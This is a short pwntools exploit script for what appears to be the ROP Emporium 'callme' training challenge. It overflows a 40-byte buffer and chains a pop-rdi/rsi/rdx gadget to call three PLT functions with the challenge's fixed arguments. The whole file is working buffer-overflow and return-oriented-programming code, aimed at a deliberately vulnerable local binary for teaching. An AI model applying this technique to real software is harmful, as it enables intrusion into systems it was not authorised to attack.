from pwn import *

context.log_level = 'debug'

elf = ELF('./callme')
rop = ROP(elf)
io = process(elf.path)

offset = 40

pop_rdi_rsi_rdx_ret = rop.find_gadget(['pop rdi','pop rsi','pop rdx','ret'])[0]

arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

callme_one_plt = elf.plt['callme_one']
callme_two_plt = elf.plt['callme_two']
callme_three_plt = elf.plt['callme_three']

payload = b'A' * offset

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_one_plt)

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_two_plt)

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_three_plt)

io.sendlineafter(b'> ', payload)
io.interactive()